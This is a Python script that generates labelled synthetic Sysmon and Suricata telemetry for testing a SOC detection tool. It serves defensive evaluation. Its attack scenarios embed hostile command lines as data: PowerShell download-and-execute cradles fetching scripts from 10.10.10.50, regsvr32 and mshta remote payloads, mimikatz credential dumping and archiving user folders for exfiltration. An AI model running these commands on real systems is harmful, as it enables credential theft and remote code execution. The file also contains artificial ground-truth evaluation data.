"""
Synthetic telemetry generator for CogniSOC evaluation.

Generates a realistic mix of benign (baseline) and malicious (attack)
telemetry modeled after Sysmon + Suricata events from a SOC lab environment.

Each event carries a `ground_truth` label: "benign" or "malicious" plus the
ATT&CK technique ID for malicious events.
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any


# ── Benign process pool ──────────────────────────────────────────────────────

BENIGN_PROCESSES = [
    ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\userinit.exe"),
    ("C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\taskhostw.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Windows\\System32\\RuntimeBroker.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Windows\\System32\\SearchIndexer.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\System32\\dllhost.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Windows\\System32\\conhost.exe", "C:\\Windows\\System32\\csrss.exe"),
    ("C:\\Windows\\System32\\lsass.exe", "C:\\Windows\\System32\\wininit.exe"),
    ("C:\\Windows\\System32\\spoolsv.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Program Files\\Windows Defender\\MsMpEng.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\System32\\WmiPrvSE.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Windows\\System32\\backgroundTaskHost.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Windows\\System32\\sihost.exe", "C:\\Windows\\System32\\svchost.exe"),
]

BENIGN_COMMANDS = [
    "svchost.exe -k netsvcs",
    "svchost.exe -k LocalServiceNetworkRestricted",
    "notepad.exe",
    "taskhostw.exe",
    "RuntimeBroker.exe -Embedding",
    "SearchIndexer.exe /Embedding",
    "dllhost.exe /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}",
    "conhost.exe 0xffffffff -ForceV1",
    "spoolsv.exe",
    "backgroundTaskHost.exe -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca",
]

BENIGN_DEST_IPS = ["10.10.10.1", "10.10.10.2", "10.10.10.5", "8.8.8.8", "1.1.1.1"]
BENIGN_DEST_PORTS = [53, 80, 443, 445, 135]


# ── Attack scenarios (modeled after Atomic Red Team) ─────────────────────────

ATTACK_SCENARIOS = [
    {
        "technique": "T1059.001",
        "name": "Suspicious PowerShell Execution",
        "events": [
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent": "C:\\Windows\\explorer.exe",
                "cmdline": "powershell.exe -NoP -NonI -EncodedCommand SQBFAFgA",
            },
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "powershell.exe -ep bypass -file C:\\temp\\invoke-mimikatz.ps1",
            },
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/shell.ps1')",
            },
        ] * 5,  # 15 PS events in the window
    },
    {
        "technique": "T1059.003",
        "name": "Encoded Command Execution",
        "events": [
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "cmdline": "powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3",
            },
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\cmd.exe",
                "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "cmd.exe /c whoami && ipconfig && net user",
            },
        ] * 6,
    },
    {
        "technique": "T1218.010",
        "name": "Regsvr32 LOLBin Execution",
        "events": [
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\regsvr32.exe",
                "parent": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "regsvr32.exe /s /n /u /i:http://10.10.10.50/file.sct scrobj.dll",
            },
            {
                "type": "sysmon",
                "event_id": "3",
                "image": "C:\\Windows\\System32\\regsvr32.exe",
                "src_ip": "10.10.10.15",
                "dst_ip": "10.10.10.50",
                "dst_port": 80,
            },
        ] * 3,
    },
    {
        "technique": "T1218.011",
        "name": "Rundll32 LOLBin Execution",
        "events": [
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\rundll32.exe",
                "parent": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
            },
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\mshta.exe",
                "parent": "C:\\Windows\\System32\\rundll32.exe",
                "cmdline": "mshta.exe http://10.10.10.50/payload.hta",
            },
        ] * 3,
    },
    {
        "technique": "T1048.003",
        "name": "Data Exfiltration Over HTTP",
        "events": [
            {
                "type": "sysmon",
                "event_id": "3",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "src_ip": "10.10.10.15",
                "dst_ip": "10.10.10.50",
                "dst_port": 8080,
            },
            {
                "type": "sysmon",
                "event_id": "11",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent": "C:\\Windows\\explorer.exe",
                "cmdline": "powershell.exe Compress-Archive -Path C:\\Users\\* -DestinationPath C:\\temp\\exfil.zip",
            },
            {
                "type": "suricata",
                "signature": "ET POLICY Possible HTTP Data Exfiltration",
                "category": "Potentially Bad Traffic",
                "src_ip": "10.10.10.15",
                "dst_ip": "10.10.10.50",
                "dst_port": 8080,
            },
        ] * 4,
    },
    {
        "technique": "T1046",
        "name": "Network Port Scanning",
        "events": [
            *[
                {
                    "type": "sysmon",
                    "event_id": "3",
                    "image": "C:\\Users\\admin\\nmap.exe",
                    "src_ip": "10.10.10.15",
                    "dst_ip": "10.10.10.1",
                    "dst_port": port,
                }
                for port in range(20, 200)  # 180 unique ports
            ],
            {
                "type": "suricata",
                "signature": "ET SCAN Potential VNC Scan",
                "category": "Attempted Information Leak",
                "src_ip": "10.10.10.15",
                "dst_ip": "10.10.10.1",
                "dst_port": 5900,
            },
            {
                "type": "suricata",
                "signature": "ET SCAN Nmap Scripting Engine User-Agent Detected",
                "category": "Attempted Information Leak",
                "src_ip": "10.10.10.15",
                "dst_ip": "10.10.10.1",
                "dst_port": 80,
            },
            {
                "type": "suricata",
                "signature": "ET SCAN Suspicious inbound to port 445",
                "category": "Potentially Bad Traffic",
                "src_ip": "10.10.10.15",
                "dst_ip": "10.10.10.1",
                "dst_port": 445,
            },
        ],
    },
    {
        "technique": "T1003.001",
        "name": "Credential Dumping via Mimikatz",
        "events": [
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
            },
            {
                "type": "sysmon",
                "event_id": "1",
                "image": "C:\\temp\\mimikatz.exe",
                "parent": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
            },
            {
                "type": "sysmon",
                "event_id": "10",
                "image": "C:\\temp\\mimikatz.exe",
                "parent": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "mimikatz.exe accessing lsass.exe",
            },
        ] * 4,
    },
]

HOST = "WIN10-VICTIM"
SOURCE_IP = "10.10.10.15"


def _make_sysmon_event(
    ts: str,
    event_def: dict[str, Any],
    technique: str,
    label: str,
) -> dict[str, Any]:
    """Create a Sysmon-style Splunk record."""
    event: dict[str, Any] = {
        "_time": ts,
        "host": HOST,
        "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "EventID": event_def.get("event_id", "1"),
        "ground_truth": label,
        "attack_technique": technique if label == "malicious" else "",
    }
    if "image" in event_def:
        event["Image"] = event_def["image"]
    if "parent" in event_def:
        event["ParentImage"] = event_def["parent"]
    if "cmdline" in event_def:
        event["CommandLine"] = event_def["cmdline"]
    if "src_ip" in event_def:
        event["SourceIp"] = event_def["src_ip"]
    if "dst_ip" in event_def:
        event["DestinationIp"] = event_def["dst_ip"]
    if "dst_port" in event_def:
        event["DestinationPort"] = str(event_def["dst_port"])
    if "event_id" in event_def and event_def["event_id"] == "3":
        event["Protocol"] = "tcp"
    return event


def _make_suricata_event(
    ts: str,
    event_def: dict[str, Any],
    technique: str,
    label: str,
) -> dict[str, Any]:
    """Create a Suricata-style Splunk record."""
    raw_payload = {
        "timestamp": ts,
        "event_type": "alert",
        "src_ip": event_def.get("src_ip", SOURCE_IP),
        "dest_ip": event_def.get("dst_ip", "10.10.10.1"),
        "dest_port": event_def.get("dst_port", 80),
        "proto": "TCP",
        "alert": {
            "signature": event_def.get("signature", ""),
            "category": event_def.get("category", ""),
        },
    }
    return {
        "_time": ts,
        "host": "ubuntu-siem",
        "sourcetype": "suricata",
        "_raw": json.dumps(raw_payload),
        "ground_truth": label,
        "attack_technique": technique if label == "malicious" else "",
    }


def generate_benign_window(
    start: datetime,
    duration_minutes: int = 15,
    event_count: int | None = None,
) -> list[dict[str, Any]]:
    """Generate a window of normal/benign telemetry."""
    if event_count is None:
        event_count = random.randint(8, 30)
    events: list[dict[str, Any]] = []
    for _ in range(event_count):
        offset = random.uniform(0, duration_minutes * 60)
        ts = (start + timedelta(seconds=offset)).strftime("%Y-%m-%dT%H:%M:%SZ")
        image, parent = random.choice(BENIGN_PROCESSES)
        cmdline = random.choice(BENIGN_COMMANDS)

        # 80% process events, 20% network events
        if random.random() < 0.8:
            events.append({
                "_time": ts,
                "host": HOST,
                "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
                "EventID": "1",
                "Image": image,
                "ParentImage": parent,
                "CommandLine": cmdline,
                "ground_truth": "benign",
                "attack_technique": "",
            })
        else:
            events.append({
                "_time": ts,
                "host": HOST,
                "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
                "EventID": "3",
                "Image": image,
                "SourceIp": SOURCE_IP,
                "DestinationIp": random.choice(BENIGN_DEST_IPS),
                "DestinationPort": str(random.choice(BENIGN_DEST_PORTS)),
                "Protocol": "udp" if random.random() < 0.5 else "tcp",
                "ground_truth": "benign",
                "attack_technique": "",
            })
    return events


def generate_attack_window(
    start: datetime,
    scenario: dict[str, Any],
    duration_minutes: int = 15,
) -> list[dict[str, Any]]:
    """Generate attack telemetry for a single ATT&CK scenario within a time window."""
    events: list[dict[str, Any]] = []
    technique = scenario["technique"]
    attack_events = scenario["events"]

    for i, event_def in enumerate(attack_events):
        offset = (i / max(len(attack_events), 1)) * duration_minutes * 60
        offset += random.uniform(0, 30)
        ts = (start + timedelta(seconds=offset)).strftime("%Y-%m-%dT%H:%M:%SZ")

        if event_def.get("type") == "suricata":
            events.append(_make_suricata_event(ts, event_def, technique, "malicious"))
        else:
            events.append(_make_sysmon_event(ts, event_def, technique, "malicious"))

    # Also inject some benign noise into attack windows (realistic)
    benign_noise = generate_benign_window(start, duration_minutes, event_count=random.randint(5, 12))
    events.extend(benign_noise)

    return events


def generate_full_dataset(
    benign_windows: int = 40,
    attack_repetitions: int = 3,
    start_time: datetime | None = None,
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    """Generate a complete evaluation dataset.

    Returns:
        (all_events, ground_truth_windows) where ground_truth_windows has
        entries with {entity, time_window, label, technique}.
    """
    if start_time is None:
        start_time = datetime(2026, 5, 26, 8, 0, 0, tzinfo=timezone.utc)

    all_events: list[dict[str, Any]] = []
    window_labels: list[dict[str, Any]] = []
    current_time = start_time

    # Generate benign baseline windows
    for _ in range(benign_windows):
        events = generate_benign_window(current_time)
        all_events.extend(events)
        window_labels.append({
            "entity": HOST,
            "time_window": current_time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "label": "benign",
            "technique": "",
        })
        current_time += timedelta(minutes=15)

    # Generate attack windows (each scenario repeated)
    for scenario in ATTACK_SCENARIOS:
        for _ in range(attack_repetitions):
            events = generate_attack_window(current_time, scenario)
            all_events.extend(events)
            window_labels.append({
                "entity": HOST,
                "time_window": current_time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "label": "malicious",
                "technique": scenario["technique"],
            })
            current_time += timedelta(minutes=15)

    # Sort events by timestamp
    all_events.sort(key=lambda e: e.get("_time", ""))

    return all_events, window_labels


def save_dataset(output_dir: str | Path = "evaluation/data") -> None:
    """Generate and save the full evaluation dataset."""
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)

    random.seed(42)  # Reproducibility
    all_events, window_labels = generate_full_dataset()

    # Save events as JSONL
    events_file = output_path / "evaluation_telemetry.jsonl"
    with events_file.open("w", encoding="utf-8") as f:
        for event in all_events:
            f.write(json.dumps(event) + "\n")

    # Save ground truth
    gt_file = output_path / "ground_truth.json"
    gt_file.write_text(json.dumps(window_labels, indent=2), encoding="utf-8")

    total_events = len(all_events)
    benign_events = sum(1 for e in all_events if e["ground_truth"] == "benign")
    malicious_events = total_events - benign_events
    benign_windows = sum(1 for w in window_labels if w["label"] == "benign")
    malicious_windows = len(window_labels) - benign_windows

    print(f"[+] Generated evaluation dataset:")
    print(f"    Total events:      {total_events}")
    print(f"    Benign events:     {benign_events}")
    print(f"    Malicious events:  {malicious_events}")
    print(f"    Benign windows:    {benign_windows}")
    print(f"    Malicious windows: {malicious_windows}")
    print(f"    Saved to:          {output_path}")


if __name__ == "__main__":
    save_dataset()
